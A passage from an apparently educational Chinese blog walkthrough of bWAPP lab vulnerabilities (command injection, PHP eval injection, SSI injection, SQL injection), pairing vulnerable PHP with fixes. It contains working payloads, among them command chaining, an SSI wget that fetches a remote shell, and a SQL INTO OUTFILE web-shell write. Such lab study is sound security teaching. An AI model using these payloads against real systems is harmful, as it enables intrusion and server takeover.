class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">commandi</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> $data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"target"</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">      $target = $_POST[<span class="string">"target"</span>];</span><br><span class="line">      <span class="keyword">if</span>($target == <span class="string">""</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"&lt;font color=\"red\"&gt;Enter a domain name...&lt;/font&gt;"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"&lt;p align=\"left\"&gt;"</span>.shell_exec(<span class="string">"nslookup  "</span>.commandi($target)).<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入一个域名，返回它的 DNS 信息，这里没有对输入进行过滤，可以实现任意命令执行。</p><p>这里是通过 shell_exec 函数执行系统命令，类似的函数还有 system，exec</p><h2 id="利用方式-6"><a href="#利用方式-6" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ; 结尾，执行完前面的命令再执行 whoami</span></span><br><span class="line">www.baidu.com ; whoami</span><br><span class="line"><span class="comment">// | 不执行前面的，只执行 whoami</span></span><br><span class="line">www.baidu.com | whoami</span><br><span class="line"><span class="comment">// &amp;&amp; 先执行前面的，再执行 whoami</span></span><br><span class="line">www.baidu.com &amp;&amp; whoami</span><br><span class="line"><span class="comment">// &amp; 先执行 whoami 再执行前面的</span></span><br><span class="line">www.baidu.com &amp; whoami</span><br></pre></td></tr></table></figure><h2 id="防护方式-6"><a href="#防护方式-6" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">commandi</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $input = str_replace(<span class="string">"&amp;"</span>, <span class="string">""</span>, $data);</span><br><span class="line">    $input = str_replace(<span class="string">";"</span>, <span class="string">""</span>, $input);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只过滤了 <code>&amp;</code> 和 <code>;</code> ，仍然可以使用 <code>|</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">commandi_check_2</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> escapeshellcmd($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>escapeshellcmd 对 shell 元字符转义</p><p>反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF。 &#39; 和 “ 仅在不配对的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p><h1 id="PHP-Code-Injection"><a href="#PHP-Code-Injection" class="headerlink" title="PHP Code Injection"></a>PHP Code Injection</h1><h2 id="产生原因-7"><a href="#产生原因-7" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_REQUEST[&quot;message&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">?&gt;</span><br><span class="line">  &lt;p&gt;&lt;i&gt;&lt;?php @eval (&quot;echo &quot;.$_REQUEST[&quot;message&quot;].&quot;;&quot;);?&gt;&lt;/i&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>eval 函数执行 message 传入的参数，且没有过滤参数</p><p>如果输入 phpinfo() ，输出代码就变为 <code>&lt;?php @eval(&quot;echo phpinfo();&quot;) ?&gt;</code>，这样就实现了任意代码执行，类似的函数还有 assert 函数</p><h2 id="利用方式-7"><a href="#利用方式-7" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload : </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查看 phpinfo</span></span><br><span class="line">?message=phpinfo()</span><br><span class="line"><span class="comment">// 查看目录</span></span><br><span class="line">?message=var_dump(scandir(<span class="string">'./'</span>))</span><br><span class="line"><span class="comment">// 执行任意命令</span></span><br><span class="line"><span class="number">1</span>;system(whoami)</span><br></pre></td></tr></table></figure><h2 id="防护方式-7"><a href="#防护方式-7" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">"message"</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">   &lt;p&gt;&lt;i&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> htmlspecialchars($_REQUEST[<span class="string">"message"</span>], ENT_QUOTES, <span class="string">"UTF-8"</span>);;<span class="meta">?&gt;</span>&lt;/i&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>htmlspecialchars 过滤且没有 eval 函数</p><h1 id="Server-Side-Includes-SSI-Injection"><a href="#Server-Side-Includes-SSI-Injection" class="headerlink" title="Server-Side Includes (SSI) Injection"></a>Server-Side Includes (SSI) Injection</h1><h2 id="补充知识-1"><a href="#补充知识-1" class="headerlink" title="补充知识"></a>补充知识</h2><p>SSIs are directives present on Web applications used to feed an HTML<br>page with dynamic contents. They are similar to CGIs, except that SSIs<br>are used to execute some actions before the current page is loaded or<br>while the page is being visualized. In order to do so, the web server<br>analyzes SSI before supplying the page to the user. </p><p>The Server-Side Includes attack allows the exploitation of a web<br>application by injecting scripts in HTML pages or executing arbitrary<br>codes remotely. It can be exploited through manipulation of SSI in use<br>in the application or force its use through user input fields. </p><p>SSIs 是使用动态内容填充 HTML 页面。它和 CGIs 类似，但是 SSIs 会在页面加载之前或者用户看到之前进行一些动作。在把页面返回给用户之前，Web 服务器会解析 SSI。SSI 攻击允许利用 Web 应用在 HTML 页面中插入脚本或者执行任意远程代码。它可以通过使用 SSI 操作的 Web 应用利用，或者通过用户输入字段强制使用。</p><p>SSI 类似于模板渲染，在页面加载之前，服务器会解析其中的内容。</p><p><a href="https://www.secpulse.com/archives/66934.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/66934.html</a></p><h2 id="产生原因-8"><a href="#产生原因-8" class="headerlink" title="产生原因"></a>产生原因</h2><p>ssii.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"form"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $firstname = ucwords(xss($_POST[<span class="string">"firstname"</span>]));</span><br><span class="line">    $lastname = ucwords(xss($_POST[<span class="string">"lastname"</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($firstname == <span class="string">""</span> <span class="keyword">or</span> $lastname == <span class="string">""</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $field_empty = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $line = <span class="string">'&lt;p&gt;Hello '</span>.$firstname.<span class="string">' '</span>.$lastname.<span class="string">',&lt;/p&gt;&lt;p&gt;Your IP address is:'</span>.<span class="string">'&lt;/p&gt;&lt;h1&gt;&lt;!--#echo var="REMOTE_ADDR" --&gt;&lt;/h1&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Writes a new line to the file</span></span><br><span class="line">        $fp = fopen(<span class="string">"ssii.shtml"</span>, <span class="string">"w"</span>);</span><br><span class="line">        fputs($fp, $line, <span class="number">200</span>);</span><br><span class="line">        fclose($fp);</span><br><span class="line"></span><br><span class="line">        header(<span class="string">"Location: ssii.shtml"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ssii.shtml</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello Wwww Wwww,<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>Your IP address is:<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="comment">&lt;!--#echo var="REMOTE_ADDR" --&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>未对输入过滤，导致可以构造 SSI 语句，提交到后端执行</p><h2 id="利用方式-8"><a href="#利用方式-8" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload : </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// List files of directory</span><br><span class="line"><span class="comment">&lt;!--#exec cmd="ls" --&gt;</span></span><br><span class="line">// Get shell</span><br><span class="line"><span class="comment">&lt;!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" --&gt;</span></span><br></pre></td></tr></table></figure><h2 id="防护方式-8"><a href="#防护方式-8" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 addslashes 函数转义，把双引号去掉就可以了</p><p>绕过 : </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// List files of directory</span><br><span class="line"><span class="comment">&lt;!--#exec cmd=ls --&gt;</span></span><br><span class="line">// Get shell</span><br><span class="line"><span class="comment">&lt;!--#exec cmd=wget http://mysite.com/shell.txt | rename shell.txt shell.php --&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss_check_3</span><span class="params">($data, $encoding = <span class="string">"UTF-8"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> htmlspecialchars($data, ENT_QUOTES, $encoding); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 htmlspecialchars 函数转义</p><h1 id="SQL-Injection-GET-Search"><a href="#SQL-Injection-GET-Search" class="headerlink" title="SQL Injection (GET/Search)"></a>SQL Injection (GET/Search)</h1><h2 id="产生原因-9"><a href="#产生原因-9" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"title"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $title = $_GET[<span class="string">"title"</span>];</span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies WHERE title LIKE '%"</span> . sqli($title) . <span class="string">"%'"</span>;</span><br><span class="line"></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// die("Error: " . mysql_error());</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入参数 title，查询数据库中是否有满足 title 条件的记录</p><p>此处未对传入参数过滤，如果输入 <code>a%&#39;</code>，输出代码就变为 <code>SELECT * FROM movies WHERE title LIKE &#39;%a%&#39;%&#39;</code>，语句错误，报错无法查询</p><h2 id="利用方式-9"><a href="#利用方式-9" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload : </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 判断查询的字段数及出现位置</span><br><span class="line">a%&apos; union select 1,2,3,4,5,6,7 #</span><br><span class="line">// 查询所有表</span><br><span class="line">a%&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4,5,6,7 #</span><br><span class="line">// 写入 shell (如果有写入权限)</span><br><span class="line">a%&apos; union select 1,&quot;&lt;?php echo shell_exec($_GET[&apos;cmd&apos;])?&gt;&quot;,3,4,5,6,7 into OUTFILE &apos;/var/www/bWAPP/shell.php&apos; #</span><br></pre></td></tr></table></figure><h2 id="防护方式-9"><a href="#防护方式-9" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>addslashes 转义，暂时没有绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> mysql_real_escape_string($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mysql_real_escape_string 函数转义 SQL 语句中使用的字符串中的特殊字符，暂时没有绕过</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_7.png" alt></p><p>这两处防护无法绕过，因为绕过需要闭合 <code>&#39;%</code>，就必须要 <code>&#39;</code>，这两个函数过滤了 <code>&#39;&#39;</code></p><h1 id="SQL-Injection-GET-Select"><a href="#SQL-Injection-GET-Select" class="headerlink" title="SQL Injection (GET/Select)"></a>SQL Injection (GET/Select)</h1><h2 id="产生原因-10"><a href="#产生原因-10" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"movie"</span>]))</span><br><span class="line">&#123;   </span><br><span class="line">    $id = $_GET[<span class="string">"movie"</span>];</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the user selects a movie</span></span><br><span class="line">    <span class="keyword">if</span>($id)        </span><br><span class="line">    &#123;</span><br><span class="line">        $sql.= <span class="string">" WHERE id = "</span> . sqli($id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// die("Error: " . mysql_error());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理同上，当传入参数 movie 为 <code>1&#39;</code>时，语句为 <code>SELECT * FROM movies WHERE id = 1&#39;</code>，语法错误，无法查询</p><h2 id="利用方式-10"><a href="#利用方式-10" class="headerlink" title="利用方式"></a>利用方式</h2><p>同上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 判断查询的字段数及出现位置</span><br><span class="line">?movie=-1 union select 1,2,3,4,5,6,7 %23</span><br></pre></td></tr></table></figure><h2 id="防护方式-10"><a href="#防护方式-10" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function sqli($data)&#123;</span><br><span class="line">    return mysql_real_escape_string($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里不需要单引号也可以注入</p><p>绕过 : </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?movie=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4,5,6,7 %23</span><br></pre></td></tr></table></figure><h1 id="SQL-Injection-POST-Search"><a href="#SQL-Injection-POST-Search" class="headerlink" title="SQL Injection (POST/Search)"></a>SQL Injection (POST/Search)</h1><h2 id="产生原因-11"><a href="#产生原因-11" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"title"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $title = $_POST[<span class="string">"title"</span>];</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies WHERE title LIKE '%"</span> . sqli($title) . <span class="string">"%'"</span>;</span><br><span class="line"></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// die("Error: " . mysql_error());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理和 GET 相同，只是提交数据的方式换成了 POST</p><h2 id="利用方式-11"><a href="#利用方式-11" class="headerlink" title="利用方式"></a>利用方式</h2><p>与 GET 相同</p><h2 id="防护方式-11"><a href="#防护方式-11" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数过滤</p><h1 id="SQL-Injection-POST-Select"><a href="#SQL-Injection-POST-Select" class="headerlink" title="SQL Injection (POST/Select)"></a>SQL Injection (POST/Select)</h1><h2 id="产生原因-12"><a href="#产生原因-12" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"movie"</span>]))</span><br><span class="line">&#123;   </span><br><span class="line">    $id = $_POST[<span class="string">"movie"</span>];</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the user selects a movie</span></span><br><span class="line">    <span class="keyword">if</span>($id)        </span><br><span class="line">    &#123;</span><br><span class="line">        $sql.= <span class="string">" WHERE id = "</span> . sqli($id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// die("Error: " . mysql_error());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理和 GET 相同，只是提交数据的方式换成了 POST</p><h2 id="利用方式-12"><a href="#利用方式-12" class="headerlink" title="利用方式"></a>利用方式</h2><p>与 GET 相同</p><h2 id="防护方式-12"><a href="#防护方式-12" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数过滤</p><h1 id="SQL-Injection-AJAX-JSON-jQuery"><a href="#SQL-Injection-AJAX-JSON-jQuery" class="headerlink" title="SQL Injection (AJAX/JSON/jQuery)"></a>SQL Injection (AJAX/JSON/jQuery)</h1><h2 id="产生原因-13"><a href="#产生原因-13" class="headerlink" title="产生原因"></a>产生原因</h2><p>sqli_10-1.php</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">$(<span class="string">"#title"</span>).keyup(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">// Searches for a movie title</span></span><br><span class="line"><span class="keyword">var</span> search = &#123;<span class="attr">title</span>: $(<span class="string">"#title"</span>).val()&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AJAX call</span></span><br><span class="line">$.getJSON(<span class="string">"sqli_10-2.php"</span>, search, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">init_table();</span><br><span class="line"><span class="comment">// Constructs the table from the JSON data</span></span><br><span class="line"><span class="keyword">var</span> total = <span class="number">0</span>;</span><br><span class="line">$.each(data, <span class="function"><span class="keyword">function</span>(<span class="params">key, val</span>)</span>&#123;</span><br><span class="line">total++;</span><br><span class="line">$(<span class="string">"#table_yellow tr:last"</span>).after(<span class="string">"&lt;tr&gt;&lt;td&gt;"</span> + val.title + <span class="string">"&lt;/td&gt;&lt;td align='center'&gt;"</span> + val.release_year + <span class="string">"&lt;/td&gt;&lt;td&gt;"</span> + val.main_character + <span class="string">"&lt;/td&gt;&lt;td align='center'&gt;"</span> + val.genre + <span class="string">"&lt;/td&gt;&lt;td align='center'&gt;&lt;a href='http://www.imdb.com/title/"</span> + val.imdb + <span class="string">"' target='_blank'&gt;Link&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;"</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// Empty result</span></span><br><span class="line"><span class="keyword">if</span> (total == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$(<span class="string">"#table_yellow tr:last"</span>).after(<span class="string">"&lt;tr height='30'&gt;&lt;td colspan='5' width='580'&gt;No movies were found!&lt;/td&gt;&lt;/tr&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init_table</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$(<span class="string">"#table_yellow"</span>).html(<span class="string">"&lt;tr height='30' bgcolor='#ffb717' align='center'&gt;"</span> +</span><br><span class="line"><span class="string">"&lt;td width='200'&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;"</span> +</span><br><span class="line"><span class="string">"&lt;td width='80'&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;"</span> +</span><br><span class="line"><span class="string">"&lt;td width='140'&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;"</span> +</span><br><span class="line"><span class="string">"&lt;td width='80'&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;"</span> +</span><br><span class="line"><span class="string">"&lt;td width='80'&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;"</span> +</span><br><span class="line"><span class="string">"&lt;/tr&gt;"</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>sqli_10-2.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 